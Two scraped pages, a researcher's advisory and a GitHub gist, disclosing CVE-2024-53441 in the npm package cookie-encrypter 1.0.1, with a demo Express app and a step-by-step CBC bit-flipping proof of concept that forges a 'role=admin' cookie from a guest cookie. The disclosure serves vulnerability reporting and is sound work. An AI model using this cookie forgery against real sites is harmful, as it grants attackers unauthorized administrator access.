=== Content from mathys.reboux.pro_6929d1d6_20250114_214303.html ===


[ðŸ  HOME](/)

[ðŸ“° BLOG](/blog/)

[ðŸ”’ CVEs](/CVE/)

[âœ‰ï¸ CONTACT](/#contact)

[ðŸ“„ CV](/CV)

CVE-2024-53441
# CVE-2024-53441
## Description:
An issue in the index.js decryptCookie function of cookie-encrypter v1.0.1 allows attackers to execute a bit
flipping attack.
| Field | Details |
|----------------------------|--------------------------------------------------------|
| Vulnerability type | Auth bypass using cookie |
| Vendor of Product | NPM |
| Affected Product Code Base | https://www.npmjs.com/package/cookie-encrypter - 1.0.1 |
| Affected Component | index.js decryptCookie function |
| Attack Type | Remote |
| Impact | Escalation of Privileges |
|Discoverer|Mathys REBOUX|
## Attack Vectors:
To exploit the vulnerability, someone must craft a new cookie using a bit flipping attack (AES CBC is used).
The cookie IV part (the first part) must be xored by a stream and it'll XOR the decrypted cookie too by the same
stream.
# Demo of the attack:
Let's imagine a website with the following source code:
```js
const express = require('express');
const cookieParser = require('cookie-parser');
const cookieEncrypter = require('cookie-encrypter');
const app = express();
app.use(cookieParser("NicePasswordHereItIsAGoodSecret!"));
app.use(cookieEncrypter("NicePasswordHereItIsAGoodSecret!"));
app.get('/login', function(req, res) {
res.cookie("role","guest")
res.send("logged in as guest")
})
app.get("/admin",(req,res)=>{
console.log(req.cookies)
if(req.cookies.role=="admin"){
res.send("Access granted.")
}else{
res.send("Access denied.")
}
})
app.listen(80)
```
We load /login and get a cookie as guest:
```
e:87c3aa62cf38214f7c25d66eacb4c95a:9df91af30fafe915f3ef71069653d4c1
```
We now have to XOR the IV: 87c3aa62cf38214f7c25d66eacb4c95a
We XOR it by guest and by admin to do the bit flip attack, [here is a link to help](https://gchq.github.io/CyberChef/#recipe=From\_Hex('Auto')XOR(%7B'option':'Hex','string':'67756573740000000000000000000000'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'61646d696e0000000000000000000000'%7D,'Standard',false)To\_Hex('None',0)&input=ODdjM2FhNjJjZjM4MjE0ZjdjMjVkNjZlYWNiNGM5NWE)
So we get the following crafted cookie:
```
e:81d2a278d538214f7c25d66eacb4c95a:9df91af30fafe915f3ef71069653d4c1
```
And now loading /admin we get: Access granted.
## Discoverer: Mathys REBOUX



=== Content from gist.github.com_caff5c9c_20250114_214303.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FmathysEthical%2Ff45f1503f87381090e38a33c50eec971)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FmathysEthical%2Ff45f1503f87381090e38a33c50eec971&source=header-gist)

[SignÂ in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FmathysEthical%2Ff45f1503f87381090e38a33c50eec971) [SignÂ up](/join?return_to=https%3A%2F%2Fgist.github.com%2FmathysEthical%2Ff45f1503f87381090e38a33c50eec971&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@mathysEthical](https://avatars.githubusercontent.com/u/110499907?s=64&v=4)](/mathysEthical)

# [mathysEthical](/mathysEthical)/**[cookie-encrypter.md](/mathysEthical/f45f1503f87381090e38a33c50eec971)**

Last active
December 13, 2024 23:09

Show Gist options

* [Download ZIP](/mathysEthical/f45f1503f87381090e38a33c50eec971/archive/ae7084bc7f575a1a7b01b2d3ec40c887c9940353.zip)

* [Star
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FmathysEthical%2Ff45f1503f87381090e38a33c50eec971)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FmathysEthical%2Ff45f1503f87381090e38a33c50eec971)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/mathysEthical/f45f1503f87381090e38a33c50eec971.js&quot;&gt;&lt;/script&gt;
* Save mathysEthical/f45f1503f87381090e38a33c50eec971 to your computer and use it in GitHub Desktop.

[Code](/mathysEthical/f45f1503f87381090e38a33c50eec971)
[Revisions
4](/mathysEthical/f45f1503f87381090e38a33c50eec971/revisions)
[Stars
1](/mathysEthical/f45f1503f87381090e38a33c50eec971/stargazers)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/mathysEthical/f45f1503f87381090e38a33c50eec971.js&quot;&gt;&lt;/script&gt;

Save mathysEthical/f45f1503f87381090e38a33c50eec971 to your computer and use it in GitHub Desktop.

[Download ZIP](/mathysEthical/f45f1503f87381090e38a33c50eec971/archive/ae7084bc7f575a1a7b01b2d3ec40c887c9940353.zip)

cookie-encrypted bit flip attack.

 [Raw](/mathysEthical/f45f1503f87381090e38a33c50eec971/raw/ae7084bc7f575a1a7b01b2d3ec40c887c9940353/cookie-encrypter.md)

[**cookie-encrypter.md**](#file-cookie-encrypter-md)

# cookie-encrypter Vulnerability (CVE-2024-53441)

Let's imagine a website with the following source code:

```
const express = require('express');
const cookieParser = require('cookie-parser');
const cookieEncrypter = require('cookie-encrypter');
const app = express();

app.use(cookieParser("NicePasswordHereItIsAGoodSecret!"));
app.use(cookieEncrypter("NicePasswordHereItIsAGoodSecret!"));

app.get('/login', function(req, res) {
    res.cookie("role","guest")
    res.send("logged in as guest")
})

app.get("/admin",(req,res)=>{
    console.log(req.cookies)
    if(req.cookies.role=="admin"){
        res.send("Access granted.")
    }else{
        res.send("Access denied.")
    }
})

app.listen(80)
```

We load /login and get a cookie as guest:

```
e:87c3aa62cf38214f7c25d66eacb4c95a:9df91af30fafe915f3ef71069653d4c1

```

We now have to XOR the IV: 87c3aa62cf38214f7c25d66eacb4c95a

We XOR it by "guest" and by "admin" to do the bit flipping attack, [here is a link to help](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'67756573740000000000000000000000'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'61646d696e0000000000000000000000'%7D,'Standard',false)To_Hex('None',0)&input=ODdjM2FhNjJjZjM4MjE0ZjdjMjVkNjZlYWNiNGM5NWE)

The two new HEX strings are the HEX representations of "guest" and "admin" followed by null bytes to prevent the XOR operation repeating. Here is [a link to get them](https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)Pad_lines('End',32,'0')Head('Nothing%20(separate%20chars)',32)&input=Z3Vlc3Q)

So we get the following crafted cookie:

```
e:81d2a278d538214f7c25d66eacb4c95a:9df91af30fafe915f3ef71069653d4c1

```

And now loading /admin we get: Access granted.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FmathysEthical%2Ff45f1503f87381090e38a33c50eec971)

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.


